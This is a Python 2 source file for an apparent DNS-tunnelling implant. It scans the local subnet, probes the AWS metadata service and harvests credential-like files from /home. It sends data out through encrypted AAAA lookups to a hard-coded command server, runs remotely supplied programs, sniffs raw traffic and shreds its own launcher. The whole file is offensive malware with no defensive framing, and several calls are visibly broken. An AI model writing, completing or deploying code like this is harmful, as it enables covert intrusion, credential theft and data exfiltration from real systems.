from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
import socket
import subprocess
import sys
import os
import getpass
import httplib
import urllib2
import struct
import codecs
import base64
import time

lhst = "10.0.65.122"

bep = "www"
breg = ""
stcd = ["3a94","bb01","1055","707a","6f54","3009","aa41","de04","a01b"]
twek = ""
nnc = "s3VdcHnYDKYDeilm"
krs = "cc6+7b25c@3c62&4"
srk = "x@y+nv6c22qgbf31"

adar = []

ri = os.popen('netstat -r | grep default').read()
rs = ri.split(" ")
rh = rs[-1].rstrip()
xs = os.popen('ifconfig ' + rh + ' | grep inet').read()
xv = xs.split(' ')
xd = xv.index('inet')
xi = xd	+ 1
xs = xv[xi]
if 'addr:' in xs:
	xn = xs[5:]
else:
	xn = xs
fhost = xn
xa = str(xn).split('.')
gwip = (xa[0] + '.' + xa[1] + '.' + xa[2] + '.1')
xt = (xa[0] + '.' + xa[1] + '.' + xa[2] + '.')
xl = (int(xa[3]) - 10)
xu = (int(xa[3]) + 10)
for cin in range(xl,xu):
	vx = xt + str(cin)
	adar.append(vx)	



def wissenschaft(data,flg):
	ad = b"Kelpie"

	ch = ChaCha20Poly1305(twek.decode("hex"))
	nc = base64.b64decode(nnc)


	if flg == 0:
		encfil = ch.encrypt(nc,data,ad)
            	return encfil.encode("hex")
	elif flg == 1:
		defil = ch.decrypt(nc,data,ad)
		return defil
	else:
		return

def jagdzeit(): #enumerate; include linux and aws artifacts
	
	krgspl = []	
	try:
		ec = open('/sys/hypervisor/uuid','r')
		ef = ec.read()
		ec.close()
		if "ec2" in ef:
			ecm = urllib2.urlopen("http://169.254.169.254/latest/meta-data").read()
		else:
			ecm = ""
	except:
		pass

	oa = os.open('netstat -untap').read()
	ob = os.open('pwd').read()
	oc = os.open('uname -a').read() 
	od = os.open('whoami').read()
	oe = os.listdir('.')
	
	rslt = []
	tx = []
	fnm = ['password','password.txt','password.csv','secret','secret.txt','secret.csv','keys','keys.txt','keys.csv','users','users.txt','users.csv','creds','creds.txt','creds.csv','private','private.txt','private.csv']
	for root, dirs, files in os.walk('/home'):
		for fi in files:
			for name in fnm:
				if name in fi:
					rslt.append(os.path.join(root,fi))
	
	for dmp in rslt:
		tr = open(dmp,'rb')
		td = tr.read()
		tx.append(td)

	te = "".join(tx)
	

def achtung():
	st = []
	sv = socket.socket(socket.AF_INET,socket.SOCK_RAW, socket.IPPROTO_TCP)
	timeout = time.time() + 60
	while time.time() < timeout_start + timeout:
		st += sv.recvfrom(65535)
	return st	

def himmelsturmer(hml): 
	es = ("./" + hml)
	ex = os.open(es).read()
	return ex

#def kugelblitz(): #dns reverse shell. 

def zinnsoldat(cretr,arg):
	global twek
	print cretr
	if "3a94" in cretr:
		abg = jagdzeit()
		sonne(abg)
		time.sleep(60)
		vergissmeinnicht("www","xyz")
	elif "a01b" in cretr:
		time.sleep(900)
		vergissmeinnicht("www","xyz")		
	elif "bb01" in cretr:
		if "a801" in arg:
			kugelblitz(18005)
		elif "a625" in arg:
			kugelblitz(19555)
		elif "b509" in arg:
			kugelblitz(25009)
		elif "b90a" in arg:
			kugelblitz(29005)
		elif "cd01" in arg:
			kugelblitz(35101)
		elif "cf09" in arg:
			kugelblitz(39505)
		elif "d225" in arg:
			kugelblitz(45225)
		elif "d922" in arg:
			kugelblitz(49225)
		elif "ed11" in arg:
			kugelblitz(51105)
		elif "ed99" in arg:
			kugelblitz(59501)
		elif "f0e9" in arg:
			kugelblitz(61119)
		else:
			kugelblitz(18111)
	elif "1055" in cretr:
		nstr = ("nslookup 606a:13ae:e11f::1055" + " " + lhst)
		orp = os.popen(nstr).read()
		ors = orp.split("\n")
		sro = ors[4].split("\t")
		trs = sro[1]
		dmc = codecs.decode(trs,'rot_13')
		cdm = base64.b64decode(dmc)
		rg = wissenschaft(cdm,1)

		stdt = himmelsturmer(rg)
		sonne(stdt)
		time.sleep(60)
		vergissmeinnicht("www","xyz")
	elif "707a" in cretr:
		nstr = ("nslookup 2001:0d66::707a" + " " + lhst)
		orp = os.popen(nstr).read()
		ors = orp.split("\n")
		sro = ors[4].split("\t")
		trs = sro[1]
		dmc = codecs.decode(trs,'rot_13')
		cdm = base64.b64decode(dmc)
		rg = wissenschaft(cdm,1)

		re = open(rg, 'r+')
		rr = re.read()
		sonne(rr)
		time.sleep(60)
		vergissmeinnicht("www","xyz")
	elif "6f54" in cretr:
		if "1af6" in arg:
			old = os.listdir('/etc')
		elif "2be5" in arg:
			old = os.listdir('/usr/bin')
		elif "3cd4" in arg:
			old = os.listdir('/home')
		elif "4dc3" in arg:
			old = os.listdir('/tmp')
		elif "5eb2" in arg:
			old = os.listdir('/')
		elif "6fa1" in arg:
			old = os.listdir('/var/www')
		elif "70a8" in arg:
			old = os.listdir('/etc/ssh')
		elif "8aa7" in arg:
			old = os.listdir('/var/log')
		else:
			cwd = os.getcwd()
			old = os.listdir(cwd)
		sonne(old)
		time.sleep(60)
		vergissmeinnicht("www","xyz")
	elif "3009" in cretr:
		acht = achtung()
		sonne(acht)
		time.sleep(60)
		vergissmeinnicht("www","xyz")
	elif "9912" in cretr:
		sys.exit()
	elif "de04" in cretr:
		cd = codecs.decode(krs,'rot_13')
		cw = cd.encode("hex")
		md = breg.replace("kelp","")
		dm = ("mx." + cw + "." + md)
		nstr = ("nslookup -query=AAAA " + dm + " " + lhst)
		rtsn = os.popen(nstr).read()
		ds = rtsn.split("\n")
		dl = len(ds) - 1
		for l in range(dl):
			if "AAAA" in ds[l]:
				da = ds[l].split("\t")[1]
		dr = da.replace("has AAAA address ","")
		sd = dr.split(":")
		for tx,rx in enumerate(sd):
			if len(rx) < 4:
				si = ("0" + rx)
				sd[tx]=si
		sj = "".join(sd)
		twek += sj
		time.sleep(15)
		vergissmeinnicht("mx","xyz")
	elif "aa41" in cretr:
		cd = codecs.decode(srk,'rot_13')
		cw = cd.encode("hex")
		md = breg.replace("kelp","")
		dm = ("mx." + cw + "." + md)
		nstr = ("nslookup -query=AAAA " + dm + " " + lhst)
		rtsn = os.popen(nstr).read()
		ds = rtsn.split("\n")
		dl = len(ds) - 1
		for l in range(dl):
			if "AAAA" in ds[l]:
				da = ds[l].split("\t")[1]
		dr = da.replace("has AAAA address ","")
		sd = dr.split(":")
		for tx,rx in enumerate(sd):
			if len(rx) < 4:
				si = ("0" + rx)
				sd[tx]=si
		sj = "".join(sd)
		twek += sj
		time.sleep(120)
		vergissmeinnicht("www","xyz")
	else:
		return

def vergissmeinnicht(bep,wp): 
	dm = (bep + "." + breg + "." + wp)
	nstr = ("nslookup -query=AAAA " + dm + " " + lhst)
	rtsn = os.popen(nstr).read()
	ds = rtsn.split("\n")
	dl = len(ds) - 1
	for l in range(dl):
		if "AAAA" in ds[l]:
			da = ds[l].split("\t")[1]
	dr = da.replace("has AAAA address ","")
	print dr
	dt = dr.split(":")[1]
	if dt in stcd:
		td = dr.split(":")[3]
		print td
		zinnsoldat(dt,td)
	else:
		return

def abgrund():
	global breg
	gg = getpass.getuser()
	if "root" in gg:
		evt = '0'
	else:
		evt = '1'
	breg = ("kelp" + evt + xa[2] + xa[3])
	return breg

def sonne(efil): #dns exfil
	if len(efil) > 16:
		kx = []
		kv = len(efil) / 16
		for k in range(kv):
			ek = k*16
			if ek + 16 < (len(efil) - 1):
				fk = 16
			else:
				rk = efil[ek:(len(efil) - 1)]
				fk = len(rk)
		mk = efil[ek:fk]
		kx += mk
	else:
		kx = efil

	for wk in kx:
		encfil = wissenschaft(wk,0)
		bg = breg.replace("kelp","")
		dm = ("plex." + encfil + "." + bg)
		nstr = ("nslookup -query=AAAA " + dm + " " + lhst)
		rtsn = os.popen(nstr).read()
		time.sleep(2)
	

if __name__ == "__main__":
	os.popen('shred -vzn 3 /home/ubuntu/kp.sh')
	abgrund()
	vergissmeinnicht("mx","xyz")
	
